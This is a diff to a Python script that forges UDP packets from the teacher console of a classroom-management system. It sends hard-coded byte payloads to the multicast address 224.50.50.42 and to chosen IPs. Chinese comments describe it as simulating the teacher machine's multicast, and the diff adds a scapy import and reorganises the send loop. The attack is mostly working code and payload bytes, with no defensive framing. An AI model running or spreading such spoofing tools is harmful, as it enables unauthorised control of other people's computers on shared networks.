@@ -2,6 +2,7 @@ import sys
 import socket
 import random
 import argparse
+import scapy
 from re import compile
 from time import sleep
 from struct import pack
@@ -174,6 +175,8 @@ store = [
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
     [
+        # 前两个位组播payload,
+        # 第三个为对申请加入的学生端的udp回应,此部分功能暂未实现
         [0x4f, 0x4f, 0x4e, 0x43, 0x00, 0x00, 0x01, 0x00, 0x10, 0x00, 0x00, 0x00, 0x19, 0x6d, 0x6a, 0xf9, 0x29, 0x5b,
          0xb9, 0x46, 0xab, 0x95, 0x8a, 0x14, 0x3e, 0xcd, 0xdc, 0x26, 0xc0, 0xa8, 0xa3, 0x01, 0x1b, 0x00, 0x00, 0x00,
          0x01, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00],
@@ -353,17 +356,17 @@ def send(send_list):
         print("[-] error 请使用 -h 以获取命令帮助")
         sys.exit(0)
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    target_host = get_ip(args.ip)
     for times in range(args.l):
         # 实现模拟教师机组播
         if args.e == 'b':
             target_host_multi = "224.50.50.42"
             for j in send_list:
-                for k in j:
+                for k in j[0:2]:
                     payload = pack("%dB" % (len(k)), *k)
                     client.sendto(payload, (target_host_multi, args.p))
         # 其他功能
         else:
+            target_host = get_ip(args.ip)
             for i in target_host:
                 for abc in send_list:
                     payload = pack("%dB" % (len(abc)), *abc)
